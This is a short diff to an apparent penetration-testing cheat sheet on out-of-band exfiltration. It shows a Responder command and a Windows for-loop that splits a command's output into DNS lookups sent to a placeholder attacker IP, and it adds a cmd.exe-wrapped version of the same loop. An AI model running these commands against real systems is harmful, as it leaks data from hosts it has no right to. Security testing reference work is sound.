@@ -24,6 +24,8 @@ responder -i <INTERFACE>
 nslookup <%VARIABLE%> <IP>
 # The DOS for loop only output the number of columns specified by the tokens parameter. 1 = %a, 2 = %b, etc.
 for /f "tokens=1,2,3" %a in ('<COMMAND>') do nslookup %a.%b.%c <IP>
+
+cmd.exe /c "for /f ""tokens=1,2,3"" %a in ('<COMMAND>') do nslookup %a.%b.%c <IP>"
 ```
 
 ### SMB
